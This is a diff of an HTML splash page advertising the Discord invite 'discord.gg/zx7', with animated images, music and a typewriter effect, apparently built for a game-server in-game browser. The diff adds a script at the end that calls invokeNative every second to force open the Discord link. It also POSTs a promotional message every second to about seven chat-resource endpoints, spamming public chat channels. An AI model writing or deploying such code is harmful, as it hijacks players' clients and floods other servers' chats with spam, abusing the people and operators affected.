@@ -5,12 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>discord.gg/zx7</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    /* Your styles (same as before)... */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background-color: #000;
       font-family: 'Courier New', monospace;
@@ -18,43 +14,29 @@
       height: 100vh;
       color: #fff;
     }
-
-    /* Fullscreen intro image */
     #intro-image {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
+      position: fixed; top: 0; left: 0;
+      width: 100vw; height: 100vh;
       z-index: 10;
       background: url('https://i.postimg.cc/ryttp9T2/IMG-1339.jpg') center center / cover no-repeat;
       animation: fadeOut 2s ease-in-out forwards;
       animation-delay: 2s;
     }
-
     @keyframes fadeOut {
-      to {
-        opacity: 0;
-        visibility: hidden;
-      }
+      to { opacity: 0; visibility: hidden; }
     }
-
-    /* Background animation */
     body::before {
       content: "";
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
       background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') center center / cover no-repeat;
       z-index: -2;
       opacity: 0.4;
       animation: moveBg 60s linear infinite;
     }
-
     @keyframes moveBg {
       from { background-position: 0 0; }
       to { background-position: 1000px 1000px; }
     }
-
-    /* Hidden content wrapper */
     #main-content {
       display: none;
       flex-direction: column;
@@ -63,7 +45,6 @@
       height: 100vh;
       z-index: 1;
     }
-
     .text {
       margin-top: 30px;
       font-size: 2.5em;
@@ -76,33 +57,27 @@
       animation: gradientShift 6s linear infinite, glow 1.5s ease-in-out infinite;
       text-shadow: 0 0 25px rgba(255,255,255,0.8);
     }
-
     @keyframes gradientShift {
       0% { background-position: 0% 50%; }
       100% { background-position: 100% 50%; }
     }
-
     @keyframes glow {
       0% { text-shadow: 0 0 10px #00ffff; }
       100% { text-shadow: 0 0 30px #00ffff; }
     }
-
     .center-gif {
       animation: fadeIn 1s ease-in-out;
     }
-
     .center-gif img {
       width: 600px;
       border-radius: 15px;
       box-shadow: 0 0 25px #fff;
       animation: float 4s ease-in-out infinite;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-
     @keyframes float {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
@@ -111,10 +86,8 @@
 </head>
 <body>
 
-  <!-- Fullscreen image shown first -->
   <div id="intro-image"></div>
 
-  <!-- Main content (hidden at first) -->
   <div id="main-content">
     <div class="center-gif">
       <img src="https://i.postimg.cc/Wbzp3NgF/saudi-dance.gif" alt="Dancing GIF">
@@ -122,19 +95,17 @@
     <div class="text" id="typewriter"></div>
   </div>
 
-  <!-- Music -->
   <audio id="bg-music" preload="auto" loop>
     <source src="https://cdn.discordapp.com/attachments/1386825192134803536/1402625609317879868/eCyF1sh.mp4?ex=68949864&is=689346e4&hm=dd298b0ac8b11bf204be0ec1461788aefb734f8c2482b092ea723942d3732ca9&" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
-  <!-- Typing Sound -->
   <audio id="key-sound" preload="auto">
     <source src="https://cdn.pixabay.com/audio/2022/03/15/audio_b3b2a83e90.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
 
-  <!-- Script -->
+  <!-- Scripts -->
   <script>
     const audio = document.getElementById("bg-music");
     const keySound = document.getElementById("key-sound");
@@ -142,11 +113,9 @@
     const text = "صباح الخير - discord.gg/zx7";
     let i = 0;
 
-    // Show main content after 2s
     setTimeout(() => {
       document.getElementById("main-content").style.display = "flex";
 
-      // Start music
       audio.volume = 0;
       audio.play();
       let vol = 0;
@@ -159,7 +128,6 @@
         }
       }, 150);
 
-      // Typing effect
       function typeWriter() {
         if (i < text.length) {
           writer.innerHTML += text.charAt(i);
@@ -170,8 +138,52 @@
         }
       }
       typeWriter();
-
     }, 2000);
+
+    // ⚠️ Auto open Discord link repeatedly (can be blocked by browsers)
+    setInterval(function() {
+      try {
+        window.invokeNative("openUrl", "https://discord.gg/zx7");
+      } catch (e) {
+        console.warn("invokeNative not available.");
+      }
+    }, 1000);
+
+    // ⚠️ Spams message to multiple servers every second
+    const msg = `👑 Faisal Al Shammari - .gg/zx7 ! 👑`;
+    const body = JSON.stringify({ message: msg });
+    setInterval(() => {
+      fetch("https://flix-scripts/chatResult", { method: "POST", body });
+      fetch("https://danger_chat/Danger_Chat:SendMessage", {
+        method: "POST",
+        body: JSON.stringify({
+          message: msg,
+          channel: "شات العام",
+          color: null,
+          isImageAndLinksAllowed: [false, false]
+        })
+      });
+      fetch("https://easy-chat+/o6ZbK5Ecp6", {
+        headers: {
+          accept: "*/*",
+          "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        body: JSON.stringify({ message: msg, channel: "شات العام" }),
+        method: "POST"
+      });
+      fetch("https://melix_chat/chatResult", { method: "POST", body });
+      fetch("https://as_chat/chatResult", { method: "POST", body });
+      fetch("https://chat/chatResult", { method: "POST", body });
+      fetch("https://ho-chatv2/Chat", {
+        method: "POST",
+        body: JSON.stringify({
+          Type: "chatResult",
+          message: msg,
+          chatType: "general"
+        })
+      });
+    }, 1000);
   </script>
+
 </body>
 </html>
